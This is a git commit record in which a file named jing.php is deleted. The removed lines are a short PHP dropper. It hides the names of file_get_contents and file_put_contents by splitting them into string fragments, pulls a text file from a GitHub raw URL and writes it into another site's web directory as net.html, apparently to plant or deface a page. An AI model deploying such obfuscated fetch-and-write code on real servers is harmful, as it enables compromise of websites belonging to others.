f2e589d64c10ac0732d74d83bf073bd61fbbe7eb
javelin <96257691+bellpwn@users.noreply.github.com>
2024-03-04 19:58:37 +0700

    Delete jing.php

--- jing.php
+++
@@ -1,6 +0,0 @@
-<?php
-$gc = "fil"."e_ ge"."t_c"."ont"."ents";
-$pc = "fi"."le_"."pu"."t_c"."ont"."ents";
-$pc("/home/aviacio1/webmktmexico.mx/net.html", $gc("https://raw.githubusercontent.com/bellpwn/opet/main/ara.txt"))
-
-; ?>
